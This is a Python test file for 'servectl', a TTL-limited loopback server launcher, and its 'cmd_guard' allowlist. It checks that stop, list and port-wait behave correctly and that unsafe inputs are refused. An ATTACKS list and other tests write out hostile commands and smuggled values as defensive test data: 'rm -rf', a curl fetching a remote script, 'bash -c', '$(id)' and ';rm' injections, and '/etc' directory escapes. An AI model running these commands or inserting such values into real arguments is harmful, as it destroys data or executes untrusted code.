"""servectl: TTL end, stop (twice), list, port wait, and the cmd_guard / allowlist rules for servectl and kill."""

import contextlib
import io
import json
import os
import socket
import subprocess
import sys
import tempfile
import time
import unittest
from unittest import mock

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import cmd_guard
import servectl
from pipeline.configuration import DEFAULT_FLAGS, SERVE_WRAPPER
from tests.support.timing import timing_sensitive
from tests.support.tmpdirs import tracked_mkdtemp

TTL = 2  # seconds: the server must be gone within TTL plus a margin
GONE_WITHIN_S = 20  # generous bound for the TTL end on a loaded host


def free_port():
    with socket.socket() as s:
        s.bind(("127.0.0.1", 0))
        return s.getsockname()[1]


def run(argv):
    """-> (exit code, stdout text) of servectl main(argv), in process."""
    buf = io.StringIO()
    with contextlib.redirect_stdout(buf):
        code = servectl.main(argv)
    return code, buf.getvalue()


def field(text, name):
    """-> the value after `name ` on the line that starts with it."""
    return next(line.split(" ", 1)[1] for line in text.splitlines() if line.startswith(name + " "))


@timing_sensitive
class ServectlTest(unittest.TestCase):
    def setUp(self):
        tmp = tempfile.TemporaryDirectory()
        self.addCleanup(tmp.cleanup)
        self.d = os.path.realpath(tmp.name)
        self.state = os.path.join(self.d, "servectl")
        self.procs: list = []
        real_popen = subprocess.Popen

        def recording_popen(*a, **kw):
            p = real_popen(*a, **kw)
            self.procs.append(p)
            return p

        patcher = mock.patch.object(servectl.subprocess, "Popen", recording_popen)
        patcher.start()
        self.addCleanup(patcher.stop)
        self.addCleanup(self.reap)  # after stop_all: servectl never waits on its supervisor, so it stays a zombie (and 'live') until reaped
        self.addCleanup(self.stop_all)  # runs before tmp.cleanup (LIFO): no server outlives the test
        cwd = os.getcwd()
        self.addCleanup(os.chdir, cwd)
        os.chdir(self.d)  # the start rule reads the cwd's pipeline.json: an empty temp dir gives the defaults

    def reap(self):
        for p in self.procs:
            try:
                p.wait(timeout=GONE_WITHIN_S)
            except subprocess.TimeoutExpired:
                p.kill()
                p.wait()

    def stop_all(self):
        with contextlib.redirect_stdout(io.StringIO()):
            servectl.main(["stop", "--state-dir", self.state])

    def serve(self, ttl=TTL, port=None):
        """Start a loopback http.server with TTL on a free port, wait until ready. -> (pid, port)."""
        port = port or free_port()
        code, out = run(
            [
                "start",
                "--ttl",
                str(ttl),
                "--port-wait",
                str(port),
                "--state-dir",
                self.state,
                "--",
                "python3",
                "-m",
                "http.server",
                "--bind",
                "127.0.0.1",
                str(port),
            ]
        )
        self.assertEqual(code, 0, out)
        self.assertIn(f"ready {port}", out)
        return int(field(out, "pid")), port

    def test_ttl_ends_server(self):
        pid, port = self.serve(ttl=TTL)
        self.assertTrue(servectl.group_live(pid))
        end = time.monotonic() + GONE_WITHIN_S
        while servectl.group_live(pid) and time.monotonic() < end:
            for p in self.procs:
                p.poll()  # reap the supervisor: a zombie keeps its group 'live'
            time.sleep(0.2)
        self.assertFalse(servectl.group_live(pid), "server still alive after its TTL")
        self.assertFalse(servectl.port_open(port))

    def test_stop_kills_and_is_idempotent(self):
        pid, port = self.serve(ttl=60)
        code, out = run(["stop", "--state-dir", self.state])
        self.assertEqual((code, out.splitlines()[0]), (0, "VERDICT: DONE"))
        self.assertFalse(servectl.group_live(pid))
        self.assertFalse(servectl.port_open(port))
        self.assertEqual(os.listdir(self.state).count(f"{pid}.json"), 0)
        code, out = run(["stop", "--state-dir", self.state])  # second stop: nothing recorded, still DONE
        self.assertEqual((code, out.splitlines()[0]), (0, "VERDICT: DONE"))

    def test_list_shows_alive_then_gone_after_stop(self):
        pid, _ = self.serve(ttl=60)
        code, out = run(["list", "--state-dir", self.state])
        self.assertEqual(code, 0)
        self.assertIn(f"pid {pid} alive", out)
        run(["stop", "--state-dir", self.state])
        code, out = run(["list", "--state-dir", self.state])
        self.assertEqual((code, out), (0, ""))

    def test_port_wait_failure_stops_server(self):
        port = free_port()
        hold = socket.socket()  # bound, not listening: the server cannot bind the port and exits; nothing accepts on it
        hold.bind(("127.0.0.1", port))
        self.addCleanup(hold.close)
        code, out = run(
            [
                "start",
                "--ttl",
                "30",
                "--port-wait",
                str(port),
                "--wait-timeout",
                "2",
                "--state-dir",
                self.state,
                "--",
                "python3",
                "-m",
                "http.server",
                "--bind",
                "127.0.0.1",
                str(port),
            ]
        )
        self.assertEqual(code, 1)
        self.assertIn("ready-fail", out)
        records = [n for n in os.listdir(self.state) if n.endswith(".json")] if os.path.isdir(self.state) else []
        self.assertEqual(records, [])  # the failed start removed its own state file

    def test_bad_ttl_and_missing_command_are_refused(self):
        with self.assertRaises(SystemExit):
            run(["start", "--ttl", "0", "--state-dir", self.state, "--", "true"])
        with self.assertRaises(SystemExit):
            run(["start", "--state-dir", self.state])  # no `--`

    def test_stop_never_signals_a_reused_pid(self):
        rec = {"id": "x", "pid": os.getpid(), "pgid": os.getpgid(0), "starttime": -1, "ttl": 5, "started": time.time(), "command": ["x"], "log": ""}
        self.assertFalse(servectl.same_leader(rec["pid"], rec["starttime"]))
        self.assertFalse(servectl.terminate(rec))  # the live group is not ours: left alone, reported as still running


ATTACKS = (  # inner commands that must never start: the tool refuses each one before any process is spawned
    ["rm", "-rf", "/tmp/x"],
    ["curl", "http://example.com/x.sh", "-o", "/tmp/x.sh"],
    ["bash", "-c", "echo hi"],
)


class ServectlStartRuleTest(unittest.TestCase):
    def setUp(self):
        tmp = tempfile.TemporaryDirectory()
        self.addCleanup(tmp.cleanup)
        self.d = os.path.realpath(tmp.name)
        self.state = os.path.join(self.d, "servectl")
        cwd = os.getcwd()
        self.addCleanup(os.chdir, cwd)
        os.chdir(self.d)

    def test_attack_commands_refused_by_tool(self):
        for argv in ATTACKS:
            self.assertNotEqual(servectl.start_refusal(argv, self.d), "", argv)
            with contextlib.redirect_stderr(io.StringIO()):
                code, _ = run(["start", "--ttl", "5", "--state-dir", self.state, "--", *argv])  # refused before any spawn
            self.assertEqual(code, 2, argv)
        self.assertFalse(os.path.isdir(self.state))  # nothing recorded, nothing started

    def test_loopback_static_server_accepted(self):
        self.assertEqual(servectl.start_refusal(["python3", "-m", "http.server", "--bind", "127.0.0.1", "8000"], self.d), "")

    def test_static_server_needs_loopback_bind_and_one_port(self):
        for argv in (
            ["python3", "-m", "http.server", "8000"],
            ["python3", "-m", "http.server", "--bind", "0.0.0.0", "8000"],
            ["python3", "-m", "http.server", "--bind", "127.0.0.1", "8000", "--directory", "/"],
            ["python3", "-m", "http.server", "--bind", "127.0.0.1", "port"],
        ):
            self.assertNotEqual(servectl.start_refusal(argv, self.d), "", argv)

    def test_static_server_may_serve_a_folder_inside_the_workspace_only(self):
        base = ["python3", "-m", "http.server", "--bind", "127.0.0.1", "8000", "--directory"]
        os.makedirs(os.path.join(self.d, "dist"))
        for ok in ("dist", os.path.join(self.d, "dist"), "."):
            self.assertEqual(servectl.start_refusal([*base, ok], self.d), "", ok)
        for bad in ("/", "/etc", "../x", os.path.join(self.d, "..", "other"), "-x"):
            self.assertNotEqual(servectl.start_refusal([*base, bad], self.d), "", bad)
        self.assertNotEqual(servectl.start_refusal([*base, "dist", "--cgi"], self.d), "")  # nothing after the folder

    def test_repeated_or_equals_or_valueless_directory_flag_is_refused(self):
        base = ["python3", "-m", "http.server", "--bind", "127.0.0.1", "8000"]
        os.makedirs(os.path.join(self.d, "dist"))
        for tail in (["--directory", "dist", "--directory", "/"], ["--directory=/"], ["--directory"]):
            self.assertNotEqual(servectl.start_refusal([*base, *tail], self.d), "", tail)
        with open(os.path.join(self.d, "pipeline.json"), "w", encoding="utf-8") as f:
            json.dump({"serve_commands": ["python3 -m http.server"]}, f)  # a project prefix that allows any tail
        for tail in (["--directory", "dist", "--directory", "/"], ["--directory=/"], ["--directory"]):
            self.assertNotEqual(servectl.start_refusal(["python3", "-m", "http.server", *tail], self.d), "", tail)
        self.assertEqual(servectl.start_refusal(["python3", "-m", "http.server", "--directory", "dist"], self.d), "")

    def test_folder_that_links_out_of_the_workspace_is_refused(self):
        outside = tracked_mkdtemp()
        os.symlink(outside, os.path.join(self.d, "link"))
        argv = ["python3", "-m", "http.server", "--bind", "127.0.0.1", "8000", "--directory", "link"]
        self.assertIn("outside", servectl.start_refusal(argv, self.d))

    def test_shell_operators_and_shells_refused(self):
        base = ["python3", "-m", "http.server", "--bind", "127.0.0.1"]
        for tail in (["8000;rm", "x"], ["8000", "$(id)"], ["8000`id`"], ["8000>x"], ["8000<x"], ["8000&"], ["8000|cat"], ["8000\nrm"]):
            self.assertNotEqual(servectl.start_refusal(base + tail, self.d), "", tail)
        for argv in (["sh", "-c", "x"], ["/bin/bash", "-lc", "x"], ["env", "bash", "-c", "x"]):
            self.assertNotEqual(servectl.start_refusal(argv, self.d), "", argv)

    def test_project_serve_command_accepted_from_pipeline_json(self):
        with open(os.path.join(self.d, "pipeline.json"), "w", encoding="utf-8") as f:
            json.dump({"serve_commands": ["npm run serve"]}, f)
        self.assertEqual(servectl.start_refusal(["npm", "run", "serve", "--", "--port", "3000"], self.d), "")
        self.assertNotEqual(servectl.start_refusal(["rm", "-rf", "/tmp/x"], self.d), "")
        self.assertNotEqual(servectl.start_refusal(["npm", "run", "serve;rm"], self.d), "")
        self.assertEqual(servectl.start_refusal(["python3", "-m", "http.server", "--bind", "127.0.0.1", "8000"], self.d), "")  # defaults stay


class ServectlGuardTest(unittest.TestCase):
    def test_allowed_subcommands(self):
        for cmd in (
            f"{SERVE_WRAPPER} start --ttl 900 --port-wait 8000 -- python3 -m http.server --bind 127.0.0.1 8000",
            f"{SERVE_WRAPPER} stop",
            f"{SERVE_WRAPPER} stop --state-dir /x/y",
            f"{SERVE_WRAPPER} list",
        ):
            self.assertEqual(cmd_guard.verdict(cmd), "", cmd)

    def test_other_subcommands_denied(self):
        self.assertIn("servectl takes only", cmd_guard.verdict(f"{SERVE_WRAPPER} rm x"))
        self.assertIn("servectl takes only", cmd_guard.verdict("python3 -I /x/servectl.py _supervise --ttl 1 -- true"))

    def test_serve_bind_rule_applies_inside_start(self):
        self.assertIn("runs only these server commands", cmd_guard.verdict(f"{SERVE_WRAPPER} start --ttl 9 -- python3 -m http.server --bind 0.0.0.0 80"))

    def test_guard_refuses_attack_commands_like_the_tool(self):
        for argv in ATTACKS:
            cmd = f"{SERVE_WRAPPER} start --ttl 5 -- {' '.join(argv)}"
            self.assertNotEqual(cmd_guard.verdict(cmd), "", cmd)
        self.assertIn("runs only these server commands", cmd_guard.verdict(f"{SERVE_WRAPPER} start --ttl 5 -- rm -rf /tmp/x"))
        self.assertIn("shell with -c", cmd_guard.verdict(f"{SERVE_WRAPPER} start --ttl 5 -- bash -c 'echo hi'"))
        self.assertIn("runs only", cmd_guard.verdict(f"{SERVE_WRAPPER} start -- python3 -m http.server 8000"))
        self.assertIn("shell operators", cmd_guard.verdict(f"{SERVE_WRAPPER} start -- python3 -m http.server --bind 127.0.0.1 8000 '$(id)'"))
        self.assertEqual(cmd_guard.verdict(f"{SERVE_WRAPPER} start --ttl 5 -- python3 -m http.server --bind 127.0.0.1 8000"), "")

    def test_allowlist_servectl_narrow_and_kill_still_denied(self):
        self.assertIn(f"'Bash({SERVE_WRAPPER} start *)'", DEFAULT_FLAGS)
        self.assertIn(f"'Bash({SERVE_WRAPPER} stop)'", DEFAULT_FLAGS)
        self.assertNotIn(f"'Bash({SERVE_WRAPPER} *)'", DEFAULT_FLAGS)
        for word in ("kill", "pkill", "killall"):
            self.assertNotIn(f"'Bash({word} ", DEFAULT_FLAGS)


if __name__ == "__main__":
    unittest.main()
